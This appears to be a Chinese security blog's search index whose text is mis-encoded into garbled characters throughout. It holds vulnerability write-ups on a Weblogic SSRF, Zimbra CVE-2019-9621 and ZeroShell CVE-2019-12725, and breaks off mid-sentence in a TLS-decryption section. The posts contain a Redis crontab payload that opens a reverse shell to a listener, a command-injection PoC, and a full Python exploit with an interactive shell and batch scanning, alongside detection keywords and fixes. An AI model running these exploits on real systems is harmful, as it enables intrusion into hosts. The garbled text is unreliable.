å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ã€åŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ã€æ–‡æ¡£ç­‰ç­‰ã€‚ã€å³è¯·æ±‚åŒ…é‡Œçš„å‚æ•°å€¼ä¸ºURLã€‘ æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®ç›®æ ‡å†…éƒ¨æœåŠ¡ï¼Œæ‰€ä»¥å€Ÿç¬¬ä¸‰æ–¹æœåŠ¡å™¨ä¸ºè·³æ¿ï¼Œè®©ç¬¬ä¸‰æ–¹æœåŠ¡å™¨å¯¹å†…éƒ¨æœåŠ¡å‘èµ·è¯·æ±‚è¿›è€Œå»è®¿é—®å†…éƒ¨æœåŠ¡ ssrfæ¼æ´éªŒè¯ å› ä¸ºSSRFæ¼æ´æ˜¯æ„é€ æœåŠ¡å™¨å‘é€è¯·æ±‚çš„å®‰å…¨æ¼æ´ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯å¦æ˜¯ç”±æœåŠ¡å™¨ç«¯å‘é€çš„æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFæ¼æ´ åœ¨é¡µé¢æºç ä¸­æŸ¥æ‰¾è®¿é—®çš„èµ„æºåœ°å€ï¼Œå¦‚æœè¯¥èµ„æºåœ°å€ç±»å‹ä¸ºhttp://www.xxx.com/a.php?image=(åœ°å€)çš„å¯èƒ½å­˜åœ¨SSRFæ¼æ´ æ¦‚è¿° Weblogicä¸­å­˜åœ¨ä¸€ä¸ªSSRFæ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥å‘é€ä»»æ„HTTPè¯·æ±‚ï¼Œè¿›è€Œæ”»å‡»å†…ç½‘ä¸­redisã€fastcgiç­‰è„†å¼±ç»„ä»¶ã€‚ å½±å“èŒƒå›´ weblogic ç‰ˆæœ¬10.0.2 weblogic ç‰ˆæœ¬10.3.6 æ¼æ´åŸç†åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´ Weblogic çš„ SSRF æ¼æ´åœ°å€åœ¨/uddiexplorer/SearchPublicRegistries.jspï¼ŒæŠ“åŒ…åå¯ä»¥åœ¨è¯·æ±‚åŒ…é‡Œå‘ç°operatorå‚æ•°å€¼ä¸ºURLã€‚ å°†operatorå‚æ•°å€¼æ”¹ä¸ºå…¶ä»–urlï¼Œå†æ¬¡å‘åŒ…æµ‹è¯•ã€‚ å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°é¶æœºå¯¹æˆ‘ä»¬ä¿®æ”¹åçš„URLè¿›è¡Œäº†è®¿é—®.ä¿®æ”¹ç«¯å£åï¼Œè®¿é—®ä¸å­˜åœ¨çš„åœ°å€ï¼Œé¶æœºè¿”å›ä¿¡æ¯æç¤ºè¿æ¥ä¸åˆ°æœåŠ¡ã€‚æ‰€ä»¥å­˜åœ¨ssrfæ¼æ´ ç¯å¢ƒæ­å»ºç¼–è¯‘åŠå¯åŠ¨æµ‹è¯•ç¯å¢ƒ 1docker-compose up -d è®¿é—®http://your-ip:7001/uddiexplorer/ï¼Œæ— éœ€ç™»å½•å³å¯æŸ¥çœ‹uddiexploreråº”ç”¨ã€‚ SSRFæ¼æ´å¤ç°SSRFæ¼æ´å­˜åœ¨äºhttp://your-ip:7001/uddiexplorer/SearchPublicRegistries.jspï¼Œæˆ‘ä»¬åœ¨brupsuiteä¸‹æµ‹è¯•è¯¥æ¼æ´ã€‚è®¿é—®ä¸€ä¸ªå¯ä»¥è®¿é—®çš„IP:PORTï¼Œå¦‚http://127.0.0.1:80ï¼š 12345678GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1Host: localhostAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close å¯è®¿é—®çš„ç«¯å£å°†ä¼šå¾—åˆ°é”™è¯¯ï¼Œä¸€èˆ¬æ˜¯è¿”å›status codeï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå¦‚æœè®¿é—®çš„éhttpåè®®ï¼Œåˆ™ä¼šè¿”å›did not have a valid SOAP content-typeã€‚ ä¿®æ”¹ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç«¯å£ï¼Œå°†ä¼šè¿”å›could not connect over HTTP to serverã€‚ é€šè¿‡redisæœåŠ¡åå¼¹shellWeblogicçš„SSRFæœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç‰¹ç‚¹ï¼Œå…¶è™½ç„¶æ˜¯ä¸€ä¸ªâ€œGETâ€è¯·æ±‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥%0a%0dæ¥æ³¨å…¥æ¢è¡Œç¬¦ï¼Œè€ŒæŸäº›æœåŠ¡ï¼ˆå¦‚redisï¼‰æ˜¯é€šè¿‡æ¢è¡Œç¬¦æ¥åˆ†éš”æ¯æ¡å‘½ä»¤ï¼Œä¹Ÿå°±è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥SSRFæ”»å‡»å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ã€‚ æŸ¥çœ‹ip redisçš„æœåŠ¡ï¼Œæ˜¯å¦å¤–å¼€å¯çš„docker.é€šè¿‡é¶åœºæœåŠ¡å™¨ï¼ŒæŸ¥çœ‹ä¸€ä¸‹redisçš„ipã€‚ï¼ˆä¹Ÿå¯ä»¥é€šè¿‡çˆ†ç ´è¿›è¡Œï¼Œé€šè¿‡ssrfæ¢æµ‹å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ï¼Œdockerç¯å¢ƒç½‘æ®µä¸€èˆ¬æ˜¯172.*ï¼‰å¼€å¯æœåŠ¡çš„ç«¯å£ï¼Œæ¢æµ‹æˆåŠŸåçš„æ˜¾ç¤ºæ˜¯é¡µé¢æŠ¥é”™ç  redisé»˜è®¤ç«¯å£6379.æ£€æµ‹ä¸€ä¸‹ï¼Œæ˜¯å¦å¼€æ”¾ã€‚è¿”å›äº†did not have a valid SOAP content-type ç¡®å®å¼€æ”¾ etc/crontabæ–‡ä»¶ï¼šè®¾ç½®å®šæ—¶ä»»åŠ¡ã€‚ç”¨äºè®¾ç½®å‘¨æœŸæ€§è¢«æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ å¯è¿›è¡Œåˆ©ç”¨çš„cronæœ‰å¦‚ä¸‹å‡ ä¸ªåœ°æ–¹ï¼š &#x2F;etc&#x2F;crontab è¿™ä¸ªæ˜¯è‚¯å®šçš„ &#x2F;etc&#x2F;cron.d&#x2F;* å°†ä»»æ„æ–‡ä»¶å†™åˆ°è¯¥ç›®å½•ä¸‹ï¼Œæ•ˆæœå’Œcrontabç›¸åŒï¼Œæ ¼å¼ä¹Ÿè¦å’Œ&#x2F;etc&#x2F;crontabç›¸åŒã€‚æ¼æ´åˆ©ç”¨è¿™ä¸ªç›®å½•ï¼Œå¯ä»¥åšåˆ°ä¸è¦†ç›–ä»»ä½•å…¶ä»–æ–‡ä»¶çš„æƒ…å†µè¿›è¡Œå¼¹shellã€‚ &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root centosç³»ç»Ÿä¸‹rootç”¨æˆ·çš„cronæ–‡ä»¶ &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root debianç³»ç»Ÿä¸‹rootç”¨æˆ·çš„cronæ–‡ä»¶ å‘é€ä¸‰æ¡rediså‘½ä»¤ï¼Œå°†åå¼¹shellè„šæœ¬å†™å…¥/etc/crontabï¼š 12345set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/&lt;ç›‘å¬ip&gt;/7777 0&gt;&amp;1\\n\\n\\n\\n&quot;config set dir /etc/config set dbfilename crontabsaveaaa è¿›è¡Œurlç¼–ç ï¼š 1set%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3C%E7%9B%91%E5%90%ACip%3E%2F7777%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa æ³¨æ„ï¼Œæ¢è¡Œç¬¦æ˜¯â€œ\\r\\nâ€ï¼Œä¹Ÿå°±æ˜¯â€œ%0D%0Aâ€ã€‚ å°†urlç¼–ç åçš„å­—ç¬¦ä¸²æ”¾åœ¨ssrfçš„åŸŸååé¢ï¼Œå‘é€ï¼š 1/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.19.0.2:6379/test%0D%0A%0D%0A&lt;payload&gt; æµé‡åˆ†ææ ¹æ®åˆ©ç”¨é“¾ï¼Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œé—®é¢˜å‡ºåœ¨/uddiexplorer/SearchPublicRegistries.jspã€‚å¯ä»¥å¯¹è¿™æ¡è·¯å¾„è¿›è¡Œè®¿é—®é™åˆ¶å’Œè¿‡æ»¤ã€‚æµé‡åˆ†ææ—¶ï¼Œå¯ä»¥ä»¥è¿™ä¸ªä¸ºçªç ´ç‚¹ã€‚ å¦å¤–åå¼¹shellçš„æ—¶å€™ï¼Œä¼šæœ‰ç‰¹å¾å…³é”®å­—crontab /dev/tcp/ crontab /dev/tcp/ æå–çš„è§„åˆ™å­—æ®µä¸ºï¼šhttp_client_body ï¼Œæå–çš„æ—¶å€™ï¼Œè¿™ä¸ªå…³é”®å­—å¯ä»¥ç”¨hexæ¥æå–ã€‚ ä¿®å¤å»ºè®® ä¿®å¤çš„ç›´æ¥æ–¹æ³•æ˜¯å°†SearchPublicRegistries.jspç›´æ¥åˆ é™¤ï¼› åˆ é™¤uddiexploreræ–‡ä»¶å¤¹ï¼Œé™åˆ¶uddiexploreråº”ç”¨åªèƒ½å†…ç½‘è®¿é—®","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"weblogic","slug":"weblogic","permalink":"https://gryffinbit.top/tags/weblogic/"}],"author":"Gryffinbit"},{"title":"Zimbra RCEæ¼æ´å¤ç°åŠæµé‡åˆ†æ(CVE-2019-9621)","slug":"Zimbra-RCEæ¼æ´å¤ç°åŠæµé‡åˆ†æ-CVE-2019-9621","date":"2022-11-16T15:38:53.000Z","updated":"2024-11-12T06:58:57.000Z","comments":true,"path":"2022/11/16/Zimbra-RCEæ¼æ´å¤ç°åŠæµé‡åˆ†æ-CVE-2019-9621/","permalink":"https://gryffinbit.top/2022/11/16/Zimbra-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-9621/","excerpt":"","text":"æ¼æ´ç®€ä»‹ç®€ä»‹ å½“ Zimbra å­˜åœ¨åƒä»»æ„æ–‡ä»¶è¯»å–ã€XXEï¼ˆxmlå¤–éƒ¨å®ä½“æ³¨å…¥ï¼‰è¿™ç§æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è¯»å– localconfig.xmlé…ç½®æ–‡ä»¶ï¼Œè·å–åˆ° zimbra admin ldap passwordï¼Œå¹¶é€šè¿‡ 7071 admin ç«¯å£è¿›è¡Œ SOAP AuthRequest è®¤è¯ï¼Œå¾—åˆ° admin authtokenæ¼æ´æ˜¯åˆ©ç”¨XXEå’ŒProxyServlet SSRF æ¼æ´æ‹¿åˆ° admin authtoken åï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ åœ¨æœåŠ¡ç«¯æ‰§è¡Œä»»æ„ä»£ç ï¼Œå¨èƒç¨‹åº¦æé«˜ã€‚å½“ZimbraæœåŠ¡ç«¯æ‰“æ¥Memcachedç¼“å­˜æœåŠ¡æ˜¯ï¼Œå¯ä»¥åˆ©ç”¨SSRFæ”»å‡»è¿›è¡Œååºåˆ—åŒ–æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚ä¸è¿‡ç”±äºZimbraåœ¨å•æœåŠ¡å™¨å®‰è£…ä¸­å°½ç®¡Memcachedè™½ç„¶å¯åŠ¨ä½†æ˜¯å¹¶æ²¡æœ‰è¿›è¡Œä½¿ç”¨ï¼Œæ‰€ä»¥å…¶æ”»å‡»åœºæ™¯å—åˆ°é™åˆ¶ã€‚ æ¼æ´å½±å“ ZimbraCollaboration Server 8.8.11 ä¹‹å‰çš„ç‰ˆæœ¬éƒ½å—åˆ°å½±å“ã€‚å…·ä½“æ¥è¯´ï¼š Zimbra &lt; 8.7.11 ç‰ˆæœ¬ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ— éœ€ç™»å½•çš„æƒ…å†µä¸‹ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ Zimbra &lt; 8.8.11 ç‰ˆæœ¬ä¸­ï¼Œåœ¨æœåŠ¡ç«¯ä½¿ç”¨ Memcached åšç¼“å­˜çš„æƒ…å†µä¸‹ï¼Œç»è¿‡ç™»å½•è®¤è¯åçš„æ”»å‡»è€…å¯ä»¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å¤ç°ç¯å¢ƒå®‰è£… https://www.jianshu.com/p/722bc70ff426 å‚è€ƒæ–‡ç« https://www.jianshu.com/p/722bc70ff426","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Zimbra","slug":"Zimbra","permalink":"https://gryffinbit.top/tags/Zimbra/"}],"author":"Gryffinbit"},{"title":"ZeroShell å‘½ä»¤æ³¨å…¥æ¼æ´å¤ç°åŠæµé‡åˆ†æ(CVE-2019-12725)","slug":"ZeroShell-å‘½ä»¤æ³¨å…¥æ¼æ´å¤ç°åŠæµé‡åˆ†æ-CVE-2019-12725","date":"2022-11-16T11:06:58.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/11/16/ZeroShell-å‘½ä»¤æ³¨å…¥æ¼æ´å¤ç°åŠæµé‡åˆ†æ-CVE-2019-12725/","permalink":"https://gryffinbit.top/2022/11/16/ZeroShell-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-CVE-2019-12725/","excerpt":"","text":"æ¼æ´è¯¦æƒ…Zeroshell æ˜¯ä¸€ä¸ªå¾®å‹çš„linuxå‘è¡Œç‰ˆæœ¬ï¼Œå®ƒåŠŸèƒ½å¼ºå¤§ï¼Œå…·æœ‰å¼ºå¤§çš„routerã€radiusã€webé—¨æˆ·ã€é˜²ç«å¢™ã€virtualã€Qosã€ DHCPã€dnsè½¬å‘ç­‰åŠŸèƒ½ï¼Œå¯ä»¥ç”¨æ¥å®‰è£…åˆ°æœåŠ¡å™¨ä¸Šä¸ºå†…ç½‘æä¾›ç½‘ç»œæœåŠ¡ï¼Œè€Œä¸”å®‰è£…å’Œä½¿ç”¨éƒ½å¾ˆæ–¹ä¾¿ï¼Œæœ‰Uç›˜ï¼ŒLive CDå’ŒFlash imgageæ–‡ä»¶ç”¨äºå®‰è£…ï¼Œå¯ä»¥ä½¿ç”¨webç•Œé¢è¿›è¡Œè®¾ç½®å’Œç®¡ç†ã€‚æƒ³è‡ªå·±éƒ¨ç½²è½¯è·¯ç”±ï¼Œåˆä¸æƒ³ç¼–è¯‘ï¼Œæ‰¾é©±åŠ¨ç¨‹åºï¼Œæˆ–è€…åˆ«äººç¼–è¯‘çš„å›ºä»¶æœ‰åé—¨ï¼Œå¯ä»¥è€ƒè™‘ç”¨Zeroshellæ›¿ä»£Openwrt&#x2F;LEDEã€‚ æ€»çš„æ¥è¯´Zeroshellçš„ç‰¹æ€§åŒ…æ‹¬ï¼š è´Ÿè½½å‡è¡¡åŠå¤šç½‘ç»œè¿æ¥çš„å¤±æ•ˆè½¬ç§»ï¼Œé€šè¿‡3Gè°ƒåˆ¶è§£è°ƒå™¨çš„UMTS&#x2F;HSDPAè¿æ¥ ç”¨äºæä¾›å®‰å…¨è®¤è¯å’Œæ— çº¿ç½‘ç»œåŠ å¯†å¯†é’¥è‡ªåŠ¨ç®¡ç†çš„RADIUSæœåŠ¡å™¨ ç”¨äºæ”¯æŒç½‘é¡µç™»å½•çš„å¼ºåˆ¶ç½‘ç»œé—¨æˆ·ï¼ˆå•†åœºå’Œé…’åº—ç­‰å•†ç”¨åœºæ™¯ï¼‰ å½±å“ç‰ˆæœ¬ ZeroShell &lt; 3.9.0 éªŒè¯POC 12/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A&lt;cmd&gt;%0A%27 å¤ç°fofaæœç´¢ï¼Œæ‰¾åˆ°ç½‘ç»œä¸­è¯¥è®¾å¤‡ exp python3 CVE-2019-12725.py -u http://127.0.0.1:1111 å•ä¸ªurlæµ‹è¯• python3 CVE-2019-12725.py -c http://127.0.0.1:1111 cmdshellæ¨¡å¼ python3 CVE-2019-12725.py -f url.txt æ‰¹é‡æ£€æµ‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127import requestsimport reimport sysimport urllib3from argparse import ArgumentParserimport threadpoolfrom urllib import parsefrom time import timeimport randomurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)filename = sys.argv[1]url_list=[]#éšæœºuadef get_ua(): first_num = random.randint(55, 62) third_num = random.randint(0, 3200) fourth_num = random.randint(0, 140) os_type = [ &#x27;(Windows NT 6.1; WOW64)&#x27;, &#x27;(Windows NT 10.0; WOW64)&#x27;, &#x27;(Macintosh; Intel Mac OS X 10_12_6)&#x27; ] chrome_version = &#x27;Chrome/&#123;&#125;.0.&#123;&#125;.&#123;&#125;&#x27;.format(first_num, third_num, fourth_num) ua = &#x27; &#x27;.join([&#x27;Mozilla/5.0&#x27;, random.choice(os_type), &#x27;AppleWebKit/537.36&#x27;, &#x27;(KHTML, like Gecko)&#x27;, chrome_version, &#x27;Safari/537.36&#x27;] ) return uadef check_vuln(url): url = parse.urlparse(url) url2=url.scheme + &#x27;://&#x27; + url.netloc headers = &#123; &#x27;User-Agent&#x27;: get_ua(), &#125; # data=base64.b64encode(&quot;eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=&quot;) try: res2 = requests.get(url2 + &#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0Aid%0A%27&#x27;,headers=headers,timeout=10,verify=False) if res2.status_code==200 and &quot;uid&quot; in res2.text: print(&quot;\\033[32m[+]%s is vuln\\033[0m&quot; %url2) return 1 else: print(&quot;\\033[31m[-]%s is not vuln\\033[0m&quot; %url1) except Exception as e: print(&quot;\\033[31m[-]%s is timeout\\033[0m&quot; %url2)#cmdshelldef cmdshell(url): if check_vuln(url)==1: url = parse.urlparse(url) url1 = url.scheme + &#x27;://&#x27; + url.netloc + &#x27;/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A&#x27; while 1: shell = input(&quot;\\033[35mcmd: \\033[0m&quot;) if shell ==&quot;exit&quot;: sys.exit(0) else: headers = &#123; &#x27;User-Agent&#x27;: get_ua(), &#125; try: res = requests.get(url1 + shell + &#x27;%0A%27&#x27;,headers=headers,timeout=10,verify=False) if res.status_code==200 and len(res.text) != 0: vulntext=res.text.split(&#x27;&lt;html&gt;&#x27;) print(&quot;\\033[32m%s\\033[0m&quot; %vulntext[0]) else: print(&quot;\\033[31m[-]%s Command execution failed !\\033[0m&quot; %url1) except Exception as e: print(&quot;\\033[31m[-]%s is timeout!\\033[0m&quot; %url1)#å¤šçº¿ç¨‹def multithreading(url_list, pools=5): works = [] for i in url_list: # works.append((func_params, None)) works.append(i) # print(works) pool = threadpool.ThreadPool(pools) reqs = threadpool.makeRequests(check_vuln, works) [pool.putRequest(req) for req in reqs] pool.wait()if __name__ == &#x27;__main__&#x27;: show = r&#x27;&#x27;&#x27; _____ _ _ _____ _____ _____ __ _____ __ _____ ___________ _____ / __ \\ | | | ___| / __ \\| _ |/ | | _ | / | / __ \\|___ / __ \\| ___| | / \\/ | | | |__ ______`&#x27; / /&#x27;| |/&#x27; |`| | | |_| |______`| | `&#x27; / /&#x27; / /`&#x27; / /&#x27;|___ \\ | | | | | | __|______| / / | /| | | | \\____ |______|| | / / / / / / \\ \\ | \\__/\\ \\_/ / |___ ./ /___\\ |_/ /_| |_.___/ / _| |_./ /___./ / ./ /___/\\__/ / \\____/\\___/\\____/ \\_____/ \\___/ \\___/\\____/ \\___/\\_____/\\_/ \\_____/\\____/ CVE-2019-12725 By m2 &#x27;&#x27;&#x27; print(show + &#x27;\\n&#x27;) arg=ArgumentParser(description=&#x27;CVE-2019-12725 By m2&#x27;) arg.add_argument(&quot;-u&quot;, &quot;--url&quot;, help=&quot;Target URL; Example:http://ip:port&quot;) arg.add_argument(&quot;-f&quot;, &quot;--file&quot;, help=&quot;Target URL; Example:url.txt&quot;) arg.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Target URL; Example:http://ip:port&quot;) args=arg.parse_args() url=args.url filename=args.file cmd=args.cmd print(&#x27;[*]ä»»åŠ¡å¼€å§‹...&#x27;) if url != None and cmd == None and filename == None: check_vuln(url) elif url == None and cmd == None and filename != None: start=time() for i in open(filename): i=i.replace(&#x27;\\n&#x27;,&#x27;&#x27;) check_vuln(i) end=time() print(&#x27;ä»»åŠ¡å®Œæˆï¼Œç”¨æ—¶%d&#x27; %(end-start)) elif url == None and cmd != None and filename == None: cmdshell(cmd) æµé‡åˆ†æç”±äºæ˜¯httpsåè®®ï¼ŒwiresharkæŠ“åŒ…åéƒ½æ˜¯åŠ å¯†æµé‡ï¼Œéœ€è¦å¯¹æµé‡è¿›è¡Œè§£å¯†ã€‚ åŸç†SSL&#x2F;TLSçš„æ•´ä¸ªæ¡æ‰‹è¿‡ç¨‹ï¼š Clienthelloï¼šå‘é€å®¢æˆ·ç«¯çš„åŠŸèƒ½å’Œé¦–é€‰é¡¹ç»™æœåŠ¡å™¨ï¼Œåœ¨è¿æ¥å»ºç«‹åï¼Œå½“å¸Œæœ›é‡åå•†ã€æˆ–è€…å“åº”æœåŠ¡å™¨çš„é‡åå•†è¯·æ±‚æ—¶ä¼šå‘é€ã€‚ versionï¼šå®¢æˆ·ç«¯æ”¯æŒçš„æœ€ä½³åè®®ç‰ˆæœ¬ Randomï¼šå…±32å­—èŠ‚ï¼Œ28å­—èŠ‚éšæœºæ•°ï¼Œ4å­—èŠ‚é¢å¤–ä¿¡æ¯ï¼Œå—å®¢æˆ·ç«¯æ—¶é’Ÿå½±å“ï¼ˆä¸ºäº†é¿å…æµè§ˆå™¨æŒ‡çº¹é‡‡é›†ï¼Œç°åœ¨ä¸€èˆ¬ä¼šå¯¹4å­—èŠ‚æ—¶é’Ÿåšæ‰­æ›²ï¼‰ Session IDï¼š32å­—èŠ‚éšæœºæ•°ï¼Œç”¨äºå’ŒæœåŠ¡å™¨é‡å»ºä¼šè¯ï¼Œä¸ºç©ºè¡¨ç¤ºæ–°å»ºä¼šè¯ cipher suitï¼šå®¢æˆ·ç«¯æ”¯æŒçš„æ‰€æœ‰å¯†ç å¥—ä»¶ï¼ŒæŒ‰ä¼˜å…ˆçº§æ’åˆ— Compressionï¼šå®¢æˆ·ç«¯æ”¯æŒçš„å‹ç¼©ç®—æ³•ï¼Œé»˜è®¤æ— å‹ç¼© Extensionsï¼šç”±ä»»æ„æ•°é‡çš„æ‰©å±•ç»„æˆï¼Œæºå¸¦é¢å¤–æ•°æ® ServerHelloï¼š é€‰æ‹©å®¢æˆ·ç«¯æä¾›çš„å‚æ•°åé¦ˆå®¢æˆ·ç«¯ æœåŠ¡å™¨æ— éœ€æ”¯æŒå®¢æˆ·ç«¯æ”¯æŒçš„æœ€ä½³ç‰ˆæœ¬ï¼Œå¦‚æœæœåŠ¡å™¨ä¸æ”¯æŒå®¢æˆ·ç«¯ç‰ˆæœ¬ï¼Œå¯ä»¥æä¾›å…¶ä»–ç‰ˆæœ¬ä»¥æœŸå¾…å®¢æˆ·ç«¯å¯ä»¥æ¥å— Certificateï¼š ç”¨äºæºå¸¦æœåŠ¡å™¨X.509è¯ä¹¦é“¾ ä¸»è¯ä¹¦å¿…é¡»ç¬¬ä¸€ä¸ªå‘é€ï¼Œä¸­é—´è¯ä¹¦æŒ‰ç…§æ­£ç¡®çš„é¡ºåºè·Ÿåœ¨ä¸»è¯ä¹¦ä¹‹å æœåŠ¡å™¨å¿…é¡»ä¿è¯å‘é€çš„è¯ä¹¦å’Œé€‰æ‹©çš„ç®—æ³•å¥—ä»¶ä¸€è‡´ Certificateæ¶ˆæ¯æ—¶å¯é€‰çš„ ServerKeyExchange: æºå¸¦å¯†é’¥äº¤æ¢çš„é¢å¤–æ•°æ®ï¼Œå–å†³äºåŠ å¯†å¥—ä»¶ ServerHelloDoneï¼šæœåŠ¡å™¨å·²å°†æ‰€æœ‰é¢„è®¡çš„æ¡æ‰‹æ¶ˆæ¯å‘é€å®Œæ¯• ClientkeyExchangeï¼šæºå¸¦å®¢æˆ·ç«¯ä¸ºå¯†é’¥äº¤æ¢æä¾›çš„ä¿¡æ¯ ChangeCipherSpecï¼šå‘é€ç«¯å·²å–å¾—ç”¨ä»¥è¿æ¥å‚æ•°çš„è¶³å¤Ÿçš„ä¿¡æ¯ Finishï¼šæ¡æ‰‹å®Œæˆï¼Œæ¶ˆæ¯å†…å®¹åŠ å¯†ï¼ŒåŒæ–¹å¯ä»¥äº¤æ¢éªŒè¯ï¼Œæ•´ä¸ªæ¡æ‰‹å®Œæ•´æ€§æ‰€éœ€çš„æ•°æ® ç®—æ³•ï¼šverrify_data &#x3D; PRF(master_secret , finished_label,hash(handshake_message)) ç ´è§£æ–¹å¼ è¦è§£å¯†HTTPSæµé‡ï¼Œéœ€è¦å¾—åˆ°åŠ å¯†å¯†é’¥ï¼ŒåŠ å¯†å¯†é’¥ç”±ä¸»å¯†é’¥ã€å®¢æˆ·ç«¯éšæœºæ•°ã€æœåŠ¡å™¨éšæœºæ•°ç”Ÿæˆã€‚ç”±ä¸Šè¿°æ¡æ‰‹è¿‡ç¨‹å¯çŸ¥ï¼Œå®¢æˆ·ç«¯éšæœºæ•°å’ŒæœåŠ¡å™¨éšæœºæ•°åœ¨åŒæ–¹æ¡æ‰‹æ¶ˆæ¯ä¸­ä¼ é€’ï¼Œè€Œä¸»å¯†é’¥ï¼ˆmaster_secretï¼‰åˆ™ç”±é¢„ä¸»å¯†é’¥ï¼ˆpre_master_secretï¼‰ç»“åˆä¸¤ä¸ªéšæœºæ•°ç”Ÿæˆã€‚é¢„ä¸»å¯†é’¥é€šè¿‡å¯†ç å¥—ä»¶ä¸­çš„å¯†é’¥äº¤æ¢ç®—æ³•è¿›è¡Œäº¤æ¢ï¼ˆDHã€RSAï¼‰ã€‚ å› æ­¤ï¼Œé€šè¿‡Wiresharkè§£å¯†HTTPSï¼Œå¯ä»¥ä»ä¸¤ä¸ªåœ°æ–¹ä¸‹æ‰‹ï¼š å¯†é’¥äº¤æ¢ç®—æ³•é€‰æ‹©RSAï¼Œç„¶åæå–æœåŠ¡å™¨çš„ç§é’¥ï¼Œå°†ç§é’¥å¯¼å…¥Wiresharkï¼Œé€šè¿‡Wiresharkè§£å¯†å¯†é’¥äº¤æ¢è¿‡ç¨‹ä¸­ä¼ é€’çš„é¢„ä¸»å¯†é’¥ï¼Œå†ç»“åˆä¹‹å‰çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éšæœºæ•°ç”Ÿæˆä¸»å¯†é’¥ï¼Œè¿›ä¸€æ­¥ç”ŸæˆåŠ å¯†å¯†é’¥ï¼Œå³å¯è§£å¯†åç»­æŠ“å–åˆ°çš„åŠ å¯†æŠ¥æ–‡ã€‚ ç›´æ¥ä»å®¢æˆ·ç«¯æå–é¢„ä¸»å¯†é’¥ï¼Œç»“åˆå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éšæœºæ•°ç”ŸæˆåŠ å¯†å¯†é’¥ï¼Œå®ç°å¯¹åŠ 